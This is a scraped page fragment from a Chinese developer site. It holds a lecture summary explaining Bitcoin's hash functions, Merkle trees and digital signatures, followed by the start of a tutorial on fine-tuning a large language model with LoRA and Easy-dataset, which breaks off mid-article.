                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这节课系统讲清了支撑比特币的两大密码学支柱：哈希函数和公钥密码/数字签名，并用这些工具解释“比特币为什么能防伪、防篡改、防冒充”。</p>
<h3 data-id="heading-0">一、密码学在比特币中的角色</h3>
<ul>
<li>课程先强调电子货币系统必须解决四个核心问题：如何保密、如何防篡改、如何确认“你就是你”、以及如何防止事后否认自己转过账。密码学正是用来给这些问题提供“工程级”的技术解法的基础设施。</li>
<li>讲课中多次提醒：不要带着“传统银行系统”的思路看比特币，而要意识到在完全开放的网络环境下，只能依赖数学和算法来建立信任，这为后面所有技术细节定下了基调。</li>
</ul>
<p>例子：如果你在QQ群里转账给别人，没有任何中心机构背书，那么其他人如何确认这笔“转账记录”是真的？这就需要密码学来保证这条记录既不能被别人随便伪造，也不能被你自己事后篡改或否认。</p>
<h3 data-id="heading-1">二、哈希函数：区块链的“指纹机”</h3>
<ul>
<li>课程用“给任意数据生成短小指纹”的比喻解释哈希函数：无论原始数据多长，丢进哈希函数得到的值长度固定、看起来随机，却对输入极度敏感，一点点改动都会导致截然不同的输出。</li>
<li>重点强调哈希的三大性质：单向性（从结果几乎推不回输入）、抗碰撞（几乎不可能找到两个不同输入有同样输出）、以及雪崩效应（输入微变输出大变），这些性质保证了“只看指纹就能检查内容是否被篡改”。</li>
</ul>
<p>例子：</p>
<ul>
<li>把“转账给张三 10 BTC”文本当作输入，计算出哈希值 H1。哪怕只是偷偷把“10”改成“11”，重新算出的哈希 H2 与 H1 完全不同。于是网络里的节点只要对收到的交易重新算一遍哈希，就能立刻发现数据有没有被动过手脚。</li>
</ul>
<h3 data-id="heading-2">三、哈希在比特币中的具体用法</h3>
<ul>
<li>讲到比特币时，老师把哈希函数变成一个“命名工具”：每笔交易、每个区块都通过哈希得到一个“名字”，这个名字长度固定、便于传播，又很难和别的数据重复，因此非常适合在点对点网络中当作标识符使用。</li>
<li>此外，课程还会提到：区块头里包含上一个区块的哈希，从而形成一条哈希链；区块内部为了一次性概括所有交易，会用到更复杂的结构（默克尔树），让一个哈希值就能代表“这一整个交易集合”。</li>
</ul>
<p>例子：</p>
<ul>
<li>某一区块包含 2000 笔交易。通过默克尔树把这 2000 条记录逐层哈希，最终得到一个“总哈希”写在区块头中。以后任何人若想证明“某笔交易确实包含在这个区块内”，只要提供一条从这笔交易到树根的哈希路径即可，验证效率非常高。</li>
</ul>
<h3 data-id="heading-3">四、公钥密码与数字签名：谁在花钱</h3>
<ul>
<li>在解决“谁在花钱”之前，老师先介绍公钥密码体系：每个人有一对密钥，私钥自己保存，公钥可以公开。用私钥做的数学运算（签名），只有对应公钥能验证；反之，没有私钥的人无法伪造同样的结果。</li>
<li>课程以“签名”而不是“加密”来解释比特币的用法：用户用自己的私钥对交易内容签名，所有节点利用公开的公钥来检验这笔交易是不是由该用户发起，从而实现“谁对转账负责”的认证和不可否认性。</li>
</ul>
<p>例子：</p>
<ul>
<li>你要把 1 BTC 转给小王。你构造一条交易信息：“从我的某个 UTXO 转出 1 BTC 给小王的地址”，然后用私钥对这条消息做数字签名。全网节点收到后，用你的公钥验证签名。如果签名对得上，说明确实是你发的，而不是别人冒充你乱花你的钱。</li>
</ul>
<h3 data-id="heading-4">五、比特币地址、私钥、公钥的关系</h3>
<ul>
<li>老师会说明：普通用户看到的是“地址”，但底层是从公钥经过一系列哈希和编码得到的结果，这样做既缩短了长度，又通过多次哈希增加了安全性和容错性。</li>
<li>这一设计带来两个效果：一方面，拿到地址无法反推出公钥甚至私钥，保护了用户安全；另一方面，一旦用户用对应私钥签名，网络就能通过地址映射出公钥，再进一步验证签名是否有效，从而把“地址”和“控制权”对应起来。</li>
</ul>
<p>例子：</p>
<ul>
<li>可以把地址理解成“银行卡号”，公钥类似“卡的某些公开参数”，私钥则是“只有你知道的 PIN＋签名设备”。别人看到你的地址可以给你转账，但无法从地址推回你的私钥；只有你能对“从这个地址花钱”的交易签字。</li>
</ul>
<h3 data-id="heading-5">六、两大工具如何共同保证安全</h3>
<ul>
<li>课程最后把哈希和数字签名串联起来：哈希保证了“账本上写的内容一旦确定，任何微小篡改都会暴露”；数字签名保证了“只有真正所有者才能发起有效的转账”。合在一起，就构成了一个无需中心机构也能维持的“公开、可验证的账本系统”。</li>
<li>进一步讲，比特币通过“哈希链”让区块彼此捆绑，通过“全网节点验证签名”来过滤非法交易，再在后续章节用工作量证明、共识协议等机制解决“谁来写下一个区块”的问题，这一讲则是后面所有机制的密码学地基。</li>
</ul>
<h2 data-id="heading-6">概念总结</h2>
<p>这一讲的内容可以按你说的三块来记，既有概念，也有内在结构，还有“为啥这套东西能跑起来”的直觉。</p>
<h3 data-id="heading-7">一、记概念：几个核心密码学积木</h3>
<ul>
<li>哈希函数：输入任意长度数据，输出固定长度“指纹”，特点是单向（不能反推原文）、抗碰撞（几乎找不到两个不同输入同哈希）、雪崩效应（改一位结果大变），在比特币里用来给交易、区块、交易集合“起名字”和做完整性校验。</li>
<li>公钥 / 私钥：每个用户有一对密钥，私钥自己保管，公钥可以公开；任何人能用公钥验证“这条消息确实由对应私钥签过名”，但不能从公钥算出私钥。</li>
<li>数字签名：用私钥对“具体的交易内容”做数学运算，生成一段签名；别人拿到交易内容和签名，用公钥一验就知道是不是你签的，既可以防伪造，又让你事后不能否认自己发过这笔交易。</li>
<li>地址：对公钥做多次哈希和编码得到的短字符串，用来当“收款账号”；别人看到地址可以给你打币，但既不能从地址推出私钥，也不能单凭地址花你的钱，必须配合私钥签名才行。</li>
</ul>
<p>小例子：</p>
<ul>
<li>你写了一条消息：“给张三 1 BTC”，算出哈希是 H1，后来有人把 1 改成 2，再算一次变成 H2。由于 H1≠H2，任何节点都能一眼知道中间有人动过手脚。</li>
<li>你用私钥对“从地址 A 给地址 B 1 BTC”签名，得到 Sig。全网节点只需拿交易内容 + Sig + 你的公钥，就能验证是否真是你签的，而不是别人伪造的。</li>
</ul>
<h3 data-id="heading-8">二、记关系：交易、签名与哈希链</h3>
<ul>
<li>交易和签名的绑定：一笔比特币交易里，写清楚“花掉的是哪些之前收到的币、要转给谁、转多少”，然后对“这整条消息”做数字签名；因为签名和具体内容强绑定，任何人想改金额、改收款人，都会导致原来的签名立即失效，只能重新让持有私钥的人再签一次。</li>
<li>区块和哈希的绑定：每个区块除了交易，还包含上一个区块头的哈希值，这样一来，如果你改动历史上任何一个区块的数据，对应哈希就变了、后面所有区块里“引用的那个哈希”也会错，从而整条链都露馅，形成所谓“哈希链”。</li>
</ul>
<p>小例子：</p>
<ul>
<li>A 在第 100 号区块里给 B 转了 1 BTC。有人想把这条记录改成“转 10 BTC”，那么 100 号区块的哈希会变，101 号区块里“前一区块哈希”字段就不对了，必须连带修改 101、102、103……所有后续区块，代价巨大。</li>
<li>一棵默克尔树可以把几千笔交易“压缩”成一个哈希根写入区块头，只要任何一笔交易被改动，重新计算出的树根就不一致，说明区块被动过手脚。</li>
</ul>
<h3 data-id="heading-9">三、记直觉：数学＋广播网络＝去中心化信任</h3>
<ul>
<li>数学替代人治：传统银行系统里，是银行这个中心机构告诉你“这笔账是真的”；在比特币里，哈希和数字签名保证“只要式子对上，这就是原始持币人亲自授权、且记录未被篡改”，不需要相信某个机构，只需要相信算法的难解性。</li>
<li>广播＋多数验证替代单点记账：每笔交易发到全网，节点各自用公钥验证签名、用哈希检查数据一致性；谁来写入下一个区块交给后面的共识和挖矿机制，但所有人都用同一套数学规则来判断“哪条链、哪些交易是有效的”，于是形成一种“公共账本”，任何人都能检验、没人能轻易作假。</li>
</ul>
<p>直觉例子：</p>
<ul>
<li>想象一群人围成一圈记账，任何人都可以大声宣布“我给小王 1 BTC”；但只有你能拿出针对这句话的正确数字签名，别人无法伪造你的“声音”，而所有人都用同样的哈希和签名规则来判断这句话是否被篡改、是否真是你说的。</li>
<li>久而久之，这群人按照统一规则选出“本轮记账代表”写下一个区块；但即便如此，他也改不了既有记录，因为一改就会破坏哈希链，被其他人立即识破。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 0 到 1，微调一个自己专属的大模型]]></title>    <link>https://juejin.cn/post/7579832417747763251</link>    <guid>https://juejin.cn/post/7579832417747763251</guid>    <pubDate>2025-12-04T09:38:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579832417747763251" data-draft-id="7579832417747730483" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 0 到 1，微调一个自己专属的大模型"/> <meta itemprop="keywords" content="LLM,Agent,程序员"/> <meta itemprop="datePublished" content="2025-12-04T09:38:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型教程"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 0 到 1，微调一个自己专属的大模型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型教程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:38:59.000Z" title="Thu Dec 04 2025 09:38:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c8cea0e80fa41f488ff423dd867a66d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=MCq%2BzR%2F2ZVwKSCytrtDfCIvcU%2Bg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">一、引言</h2>
<h4 data-id="heading-1">1.1 什么是微调大模型？</h4>
<p>微调（Fine-tuning）大模型，就像是给一个已经学富五车的大脑（预训练的基础大模型），<strong>进行一次针对性的“专业强化训练”</strong> 。基础大模型通过海量数据学习了通用的语言规律和世界知识，但对于特定领域、特定任务，它可能还不够“精通”。微调就是利用少量、高质量的领域数据，在基础模型之上继续训练，让模型更好地适应新的任务或领域。<strong>也就是让大模型从一个广度很强的通才，在某个领域树上的技能加强变成一位专才。</strong></p>
<p>尤其常用的LoRA（Low-Rank Adaptation）等高效微调方法，通过只调整模型中很少一部分参数或添加少量额外层，就能达到很好的效果，大大降低了所需的计算资源和时间，让模型“学得又快又专”。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45bfb12a640f480e87fc0ca9a4f9f529~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=cnYUGEEqFXRSeD%2FBTREE8pmW1PI%3D" alt="" loading="lazy"/></p>
<p>Lora微调原理，在大模型权重文件的输出时，再添加一个可训练的低秩矩阵</p>
<h4 data-id="heading-2">1.2 为什么需要微调大语言模型</h4>
<p>预训练的大语言模型虽然强大，能理解和生成各种文本，但它们是“通才”，<strong>缺乏对特定领域细致入微的理解或完成特定复杂任务的能力</strong>。比如，在一个高度专业的行业（如医疗、法律、金融或企业内部知识库）中，模型可能不理解行业黑话、处理不了特有的文档格式或无法给出基于内部规章的准确回答。</p>
<p>通过微调，<strong>我们可以用该领域的特有数据对其进行“定制化”训练，让模型掌握领域内的专业知识、术语和逻辑，从而使其成为该领域的“专家”</strong> ，能够更准确、高效地处理垂直领域的复杂问题，提供更具价值的服务。</p>
<h2 data-id="heading-3">二、数据集准备</h2>
<h4 data-id="heading-4">2.1 领域大模型微调</h4>
<p>想象一下，在您熟悉的某个行业或公司内部，随着时间的推移，沉淀了无数宝贵的知识和经验。这些信息通常零散地存储在各种PDF、Word文档甚至扫描件中，它们是领域的精华，却也形成了难以逾越的“知识孤岛”。想要从中快速准确地找到所需的信息，或是理解某个复杂概念，<strong>往往需要耗费大量时间和精力</strong>，对于新手来说更是门槛很高。</p>
<p>试想，如果能有一个AI助手，它不仅能理解通用语言，更能像一位资深的领域专家一样，透彻地掌握并运用这些独有的垂直领域知识，随时为您答疑解惑，那该多好？这正是领域大模型微调的核心价值所在——<strong>通过将通用大模型的能力与特定领域的宝贵数据结合，我们可以打造出真正理解并能应用这些知识的垂直领域智能体。</strong></p>
<p>这个时候，用领域内知识微调后大语言模型便能派上用场了。<strong>下面我将会从整体流程的角度，梳理一遍大语言模型微调全流程的方法论，以及开源工具的使用，从而实现更加高效、安全的模型训练与部署。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8eeaeeb30ddf475b9ac1dcad42c11b24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=wAoiOPYfl0GTSV5Sy0f3jfuVKMY%3D" alt="" loading="lazy"/></p>
<p>本文的思路展示，收集领域知识文档→统一转换为Markdown格式→构造微调数据集→微调大语言模型</p>
<p>关于一些更加具体的操作后续会逐渐填坑~</p>
<h4 data-id="heading-5">2.2 文档格式的统一转换</h4>
<p>通常，由于行业内多年的知识沉淀，往往会留存大量的文件扫描件，一些遗失多年的word，为了能让后续对这些文档能进行统一的处理，<strong>我们需要将他们的格式统一为Markdown格式</strong>。</p>
<p>Markdown是一种轻量级标记语言，排版语法简洁，让人们更多地关注内容本身而非排版。它使用易读易写的纯文本格式编写文档，可与HTML混编，可导出 HTML、PDF 以及本身的.md 格式的文件。更多的相关的介绍可以参考这边的链接</p>
<p>Markdown 基本语法 | Markdown 教程markdown.com.cn/basic-syntax/</p>
<p>这边我以一个国产的工具 MinerU为例，<strong>这个工具支持本地离线部署</strong>，也可以在线使用，笔者体验下来这个工具对于pdf的识别相当的好，但是对于doc识别还是不是很好。如果有需要的话可以将doc转换为pdf再使用MinerU进行识别。</p>
<p>MinerUmineru.net/</p>
<p>这边我以一篇pdf格式的论文为例，右侧是识别出来的Markdown预览文件，可以看出来对于<strong>文字和公式</strong>的识别还是相当准确的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ad67d866f0b4887b35248678acdf1c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=%2FEIqDxxQADPJvVjP0Xe6GnarjgE%3D" alt="" loading="lazy"/></p>
<p>windows客户端可以在线识别，但是目前只支持导出Latex，docx，HTML格式的文件</p>
<p>如果想要导出Markdown文件到本地，可以在本地本地部署下MinerU，或者直接在魔搭社区的创空间进行体验</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f4252255a294a57b0f0cdb2ce2fdd6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=OxIg2ZU3YiqqbzTDoZpje%2FlFRvY%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-6"/>
<h4 data-id="heading-7">2.3 构建微调数据集</h4>
<p>现在我们得到了markdown格式的数据文件，但是这些数据仍然不能直接用来微调大模型。<strong>因为大模型所完成的任务，是通过问答的形式实现的。</strong> 也就是说，我们需要将文档的知识点全都变成一问一答的形式才能进行微调。早期的数据集构造是一个非常耗时，重复性的工作，需要人类去进行一步步地构造问题，并且根据文档的内容进行解答，但也正是这些前人的不断努力，堆出了现在大语言模型的繁荣。</p>
<p>在当前的AI水平下，<strong>让大语言模型辅助实现问答对的构造</strong>已经是一个很常见的策略了。这边我们可以使用一个国产开源工具Easy-dataset进行处理。</p>
<p>easy-dataset/README.zh-CN.md at main · ConardLi/easy-datasetgithub.com/ConardLi/easy-dataset/blob/main/README.zh-CN.md</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a54725eead84d739a61c134e39af9de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=%2BbkIXtbm8Q2wii%2BBz71uh2ERoSw%3D" alt="" loading="lazy"/></p>
<p>Easy-dataset工具流程示意</p>
<p>在处理文档之前，首先我们需要本地部署一个基础的大语言模型，这里我们<strong>使用ollama部署qwen2.5-7b</strong>模型，具体的操作可以参考下面的链接~</p>
<p>Ollama使用指南【超全版】 - 知乎zhuanlan.zhihu.com/p/704951717</p>
<p>总的来说，Easy-dataset通过我们上传的Markdown文件，将文本内容进行分割，之后让大语言模型对每个分割的片段进行提问，在生成所有的问题之后，再利用相关的片段与生成的问题对大语言模型进行提问，从而实现了将文档知识变成问答对的形式。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56ceffa0bb7940eda9b4c54072f61fda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765445939&amp;x-signature=uIWNBStvm34VCExVQZg8vmoO5TQ%3D" alt="" loading="lazy"/></p>
<p>上传Markdown之后对文档进行了切分，总共被分成了33个切片</p>
